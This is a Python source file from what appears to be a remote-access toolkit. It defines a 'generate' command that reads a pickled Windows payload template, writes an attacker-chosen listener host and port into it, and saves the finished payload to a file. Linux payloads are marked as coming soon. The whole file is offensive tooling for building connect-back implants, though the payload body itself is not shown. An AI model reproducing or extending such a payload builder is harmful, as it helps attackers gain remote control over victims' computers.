import fileinput
import importlib
import subprocess
import sys
from pickle import load
from pathlib import Path
from os import path as P


def generate(data=''):
    try:
        data = data.split('-')
        del data[0]
        plt = (data[0].replace('os ', '')).replace(' ', '')
        host = (data[1].replace('lhost ', '')).replace(' ', '')
        port = int(data[2].replace('lport ', ''))
        path = P.abspath(data[3].replace('outfile ', ''))
        name = P.basename(path)
    except:
        print("\nInvalid arguments!")
        print("Enter 'generate -h' to view full usage")
        return
    if not P.exists(path.replace(name, '')):
        print(f"\nOutfile directory '{path.replace(name, '')}' doesn't exist")
        return
    try:
        if plt == 'win':
            print("\nGenerating Windows payload...\n")
            with open(r'sources/templates/win.bin', 'rb') as win:
                data = load(win)
                win.close()
            with open(r'sources/templates/win.py', 'w') as file:
                file.write(data)
                file.close()
            for line in fileinput.input(r'sources/templates/win.py', inplace=True):
                l1 = "host = ip"
                l2 = "port = prt"
                l3 = "call = os.path.join(os.getcwd(), 'win.py')"
                if l1 in line:
                    line = line.replace(l1, f"host = '{host}'")
                if l2 in line:
                    line = line.replace(l2, f"port = {port}")
                if l3 in line:
                    line = line.replace(l3, f"call = os.path.join(os.getcwd(), '{name}')")
                sys.stdout.write(line)
            subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
            print(f"Payload generated and saved as '{path}'")
        elif plt == 'linux':
            print("\nGenerating Linux payload...\n")
            print("Coming Soon...")
        else:
            print('\nInvalid platform!')
            print("Enter 'generate -h' to view full usage")
    except Exception as e:
        print(e)
